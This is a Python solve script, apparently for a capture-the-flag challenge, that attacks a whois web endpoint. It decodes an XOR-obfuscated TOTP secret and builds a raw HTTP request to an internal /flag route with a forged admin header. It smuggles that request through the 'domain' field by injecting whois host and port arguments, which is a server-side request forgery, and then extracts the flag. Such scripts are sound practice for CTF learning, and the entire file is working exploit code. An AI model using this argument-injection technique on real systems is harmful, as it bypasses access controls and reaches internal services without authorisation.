import base64
import pyotp
import requests
import re

TARGET = "http://chal.thjcc.org:13316/"

ENC_SECRET = "Jl5cLlcsI10sKCYhLS40IykpMyQnIF8wIjEtPTM6OzI="
XOR_KEY = "thjcc"

def xor_decode(data: str, key: str) -> str:
    raw = base64.b64decode(data)
    return "".join(chr(b ^ ord(key[i % len(key)])) for i, b in enumerate(raw))

secret = xor_decode(ENC_SECRET, XOR_KEY)

totp = pyotp.TOTP(secret)
code = totp.now()

body = f"safekey={code}"
payload = f"""POST /flag HTTP/1.1
Host: 127.0.0.1
admin: thjcc
Content-Type: application/x-www-form-urlencoded
Content-Length: {len(body)}

{body}
"""

domain = f'-h 127.0.0.1 -p 13316 "{payload}"'

res = requests.post(f"{TARGET}/whois", data={"domain": domain})

flag = re.findall(r'(THJCC{.+})', res.text)[0]
print("Flag:", flag)